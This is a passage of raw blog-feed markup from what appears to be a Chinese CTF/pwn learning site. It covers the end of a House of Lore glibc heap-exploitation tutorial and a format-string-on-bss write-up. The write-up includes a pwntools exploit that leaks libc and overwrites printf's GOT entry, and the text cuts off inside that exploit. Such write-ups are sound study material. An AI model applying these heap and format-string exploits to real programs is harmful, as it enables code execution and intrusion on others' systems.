class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;另外再分配一块，避免与 top chunk 合并 %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Free victim chunk %p, 他会被插入到 fastbin 中\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n此时 victim chunk 的 fd、bk 为零\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这时候去申请一个 chunk，触发 fastbin 的合并使得 victim 进去 unsortedbin 中处理，最终被整理到 small bin 中 %p\n&quot;</span>, victim);</span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在 victim chunk 的 fd 和 bk 更新为 unsorted bin 的地址\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在模拟一个可以覆盖 victim 的 bk 指针的漏洞，让他的 bk 指针指向栈上\n&quot;</span>);</span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;然后申请跟第一个 chunk 大小一样的 chunk\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;他应该会返回 victim chunk 并且它的 bk 为修改掉的 victim 的 bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;最后 malloc 一次会返回 victim-&gt;bk 指向的那里\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n在最后一个 malloc 之后，stack_buffer_2 的 fd 指针已更改 %p\n&quot;</span>,stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 在栈上 %p\n&quot;</span>, p4);</span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用 <code>gcc -g 文件名.c</code>编译后将断点下在 19 行，可以看到程序已经申请了一个 chunk(victim)，size 为 0x71 </p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637759462221550/d8d5bdf297b3c5680a36d13d97c44cbf51545cbd.png" alt="image-20211124211101962"></p><p>再将断点下在 29 行，观察栈中 fake_chunk 的分布情况</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637760391564774/8750292817574463fa94e77266d17cb8d989a8b3.png" alt="image-20211124212631334"></p><p>再将断点下在 39 行，free victim，它的 fd 和 bk 都变成了0</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637818006283957/b2d157377f6a256b33d44fee459074b3d57ef84d.png" alt="image-20211125132646035"></p><p>再将断点下在 42 行，此前 victim 已经进入 fastbin ，malloc 后触发 fastbin 的合并，并进入 unsortedbin，最后到 smallbin</p><hr><p>为什么是 fastbin 而不是程序中所说的 unsortedbin 这里我说一下，程序原本希望在 32 位机上测试的，但我的机子是 64 位的，100的chunk &lt; max_fast(128)所以被放进了fastbin中，但如果是32位机子的话，100&gt;max_fast(64)因此被放入了unsorted bin中 )</p><hr><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637819558198076/12e57442c5023537d6bb6a512ae2d332759d8c3c.png" alt="image-20211125135238017"></p><p>现在就需要我们分配一个既不是 unsortedbin 又不是 smallbin 的 chunk 了，一个超大的 chunk 会从 top chunk 里分一块出来，然后系统会把 unsorted bin 中的 chunk 塞入属于他的 bins 中</p><hr><p>如果是32位机子会直接从unsortedbin 中被扔进 smallbins，但是64位多了几个步骤</p><p>因为我们分配了 1200 的大内存，ptmalloc 会先从 fastbin 中找，然后依次在 unsortedbin，smallbin 中查找看看有没有符合的 chunk ，因为我们没有符合的 chunk，所以 ptmalloc 会把 fastbin 的 chunk 合并，然后放到 unsortedbin 中，再从 unsortedbin 中查找，发现还是不符合，就会把 unsortedbin 中的 chunk 放入属于他的 bins 中，此时我们的 victim 就被放进了 smallbin 中了</p><hr><p>此时的 fd 和 bk 都为 unsortedbin 的地址</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637819847446306/da9bebc224c7d3ec592d40c0a7ddfb156df950b5.png" alt="image-20211125135727224"></p><p>再将断点下在 49 行，将 victim 的 bk 改为 stack_buffer_1</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637820306432657/5c8572132786e5d7e147cb09bce439c00c663d47.png" alt="image-20211125140506253"></p><p>再将断点下在 53 行，将 victim 申请出来</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1637821181542523/f1da4217f9ec280d43fbf5e0e59055284d316790.png" alt="image-20211125141941343"></p><p>最后 56 行处再次申请 chunk，即栈上伪造的chunk</p><h2 id="2-29"><a href="#2-29" class="headerlink" title="2.29"></a>2.29</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><p>2.29 加入了 tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE <span class="comment">//如果程序启用了Tcache</span></span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">        stash them in the tcache.  */</span></span><br><span class="line">        <span class="comment">//遍历整个smallbin，获取相同size的free chunk</span></span><br><span class="line">        <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="comment">//判定Tcache的size链表是否已满，并且取出smallbin的末尾Chunk。</span></span><br><span class="line">            <span class="comment">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span></span><br><span class="line">            <span class="keyword">while</span> ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                   &amp;&amp; (tc_victim = last (bin) ) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//如果成功获取了Chunk</span></span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    <span class="comment">//设置标志位</span></span><br><span class="line">                    set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">                    <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (tc_victim);</span><br><span class="line">                    <span class="comment">//取出最后一个Chunk</span></span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line">                    <span class="comment">//将其放入到Tcache中</span></span><br><span class="line">                    tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>结合之前 2.23 的源码可以发现，tcache 并没有检查 house of lore 要经历的检查 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line"><span class="keyword">if</span> ( __glibc_unlikely( bck-&gt;fd != victim ) )</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们知道，tcache 是享有绝对优先权的，我们不能越过 tcache 向 small bin 中增删 chunk（但是 calloc 函数不会在 tcache 中拿 chunk）</p><p>攻击条件有两点：</p><ol><li>small bin 中至少两个 chunk</li><li>tcache  不为空</li></ol><p>然后是 Unsorted Bin 的**<code>last remainder</code>**基址，当申请的 Chunk 大于 Unsorted Bin 中 Chunk 的大小且其为 Unsorted Bin 中的唯一 Chunk 时，该 Chunk 不会进入 Tcache 。</p><h3 id="tcache-put-函数"><a href="#tcache-put-函数" class="headerlink" title="tcache_put 函数"></a>tcache_put 函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> <span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，<code>tcache_put</code>函数没有做任何的安全检查。</p><p>那么，当 Tcache 存在两个以上的空位时，程序会将我们的 fake chunk 置入 Tcache 。</p><hr><p>参考链接</p><p><a href="https://www.anquanke.com/post/id/198173?display=mobile">https://www.anquanke.com/post/id/198173?display=mobile</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-lore/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-lore/</a></p><p><a href="https://cloud.tencent.com/developer/article/1705462">https://cloud.tencent.com/developer/article/1705462</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> smallbin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞之bss</title>
      <link href="/2021/11/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bbss/"/>
      <url>/2021/11/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bbss/</url>
      
        <content type="html"><![CDATA[<p>当格式化字符串写在栈上时，可以利用 ’%n$p‘ 来泄露 地址 和 canary ，用 ’%n$hhn‘ 根据偏移覆盖地址，改地址</p><p>并且此时偏移时很好计算的，用 <code>AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p...</code> 就可以解决</p><p>但是，当格式化字符串写在 bss 上时，偏移就不能根据以上方法来计算了</p><p>此时得利用栈来当作跳板形成链子，改函数的 got 表，达到劫持效果 <strong>( 前提 :  RELRO  保护不为 FULL RELRO )</strong></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/geshihua/1637583342983401/768fdc90c922f4f1c8e6e638445a0f5fdb8f1bdb.png" alt="image-20211122201542735"></p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804854B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your password: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s1[read(<span class="number">0</span>, s1, <span class="number">0x32</span>u)] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;wllmmllw&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is the wrong password: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(s1); <span class="comment">//格式化字符串漏洞</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Login successfully! Have fun!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------------------------------------------------------------</span><br><span class="line">.bss:<span class="number">0804B</span>0A0 ; <span class="keyword">char</span> s1[<span class="number">52</span>]</span><br><span class="line">.bss:<span class="number">0804B</span>0A0 s1              db ?                    ; DATA XREF: sub_804854B+<span class="number">1B</span>↑o</span><br><span class="line">.bss:<span class="number">0804B</span>0A0                                         ; sub_804854B+<span class="number">2</span>A↑w ...</span><br><span class="line">.bss:<span class="number">0804B</span>0A1                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A2                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A3                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A4                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A5                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A6                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A7                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A8                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A9                 db    ? ;</span><br></pre></td></tr></table></figure><p>存在格式化字符串漏洞，并且写在 bss 段上</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先用以下代码测试一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>将断点下在漏洞处,即函数 printf 调用完成后</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/geshihua/1637583805763738/41bba578e9eb1166607bc415da33ec97c22ed102.png" alt="image-20211122202325535"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/geshihua/1637583879670807/71159476cb160276b64432212a5129a97baed5f4.png" alt="image-20211122202439521"></p><p>可以发现偏移为 6 和 10 处可以形成一条链子，我们可以通过 6 来调整位置，再通过 10 来写入我们想写的地址</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/geshihua/1637583981498499/4a760d46bc31e042c413aacb2285f49bccccc50a.png" alt="image-20211122202621272"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">print(<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%12$p&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">libcbase = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">2132336</span>-<span class="number">0x40</span></span><br><span class="line">print(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">print(<span class="string">&quot;system: &quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%6$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">leak_6 = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;6: &quot;</span> + <span class="built_in">hex</span>(leak_6)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%10$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">leak_10 = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;10: &quot;</span> + <span class="built_in">hex</span>(leak_10)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x14</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">1</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xb0</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">2</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x04</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">3</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x08</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"><span class="comment">##########</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">4</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x15</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">5</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xb0</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">6</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x04</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">7</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x08</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span 